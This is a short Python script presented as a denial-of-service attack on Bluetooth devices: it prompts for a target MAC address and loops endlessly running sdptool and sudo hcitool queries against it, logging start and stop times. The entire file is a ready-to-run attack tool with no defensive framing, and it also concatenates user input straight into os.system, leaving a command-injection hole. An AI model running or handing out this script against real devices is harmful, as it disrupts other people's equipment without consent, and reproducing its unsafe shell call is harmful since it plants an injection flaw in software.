#!/usr/bin/env python3
''' Denial of service against bluetooth'''

import os
from datetime import datetime
import time

# document the start of the attack
t1 = datetime.now()

# request MAC target from the user
target = str(input("Target MAC: "))

print("\nAttack started on %s" % t1)

try:
    while True:
        # first attack
        os.system('sdptool records ' + target)
        time.sleep(0.1)
        # second attack
        os.system('sudo hcitool info ' + target)

# to stop the attack ctrl + c
except KeyboardInterrupt:
    t2 = datetime.now()
    print('Attack stopped at %s' % t2)
    print('\n The attack lasted', t2 - t1)
